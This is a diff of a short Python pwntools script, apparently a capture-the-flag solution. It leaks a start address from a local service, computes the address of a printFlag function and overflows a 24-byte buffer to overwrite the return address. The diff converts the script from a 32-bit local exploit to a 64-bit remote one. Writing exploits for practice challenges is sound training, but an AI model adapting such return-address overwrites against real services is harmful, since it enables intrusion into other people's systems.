@@ -1,19 +1,32 @@
-#!/usr/bin/env python
+#!/usr/bin/env python3
 
 from pwn import *
 
-elf = ELF('./pwn')
-p = elf.process()
+#elf = ELF('./server')
+#p = elf.process()
 
-address_start = int(p.recv().decode().split('\n')[-3].split('0x')[-1],16)
-address_flag_function = address_start - 126
+host="localhost"
+port=1345
+
+process = remote(host, port)
+
+start_offset = 0x00000000000012da
+printFlag_offset = 0x0000000000001255
+
+address_sentence = process.recv().decode().split('\n')[-3]
+given_start_address = address_sentence.split('0x')[-1]
+
+printFlag_address = int(given_start_address,16) - start_offset + printFlag_offset
+
+buffer_size = 24
 
 payload = [
-    b'A' * 28,
-    p32(address_flag_function)
+    b'A' * buffer_size,
+    p64(printFlag_address)
 ]
 
-payload = b"".join(payload)
+payload = b''.join(payload)
 
-p.sendline(payload)
-p.interactive()
+process.sendline(payload)
+
+process.interactive()
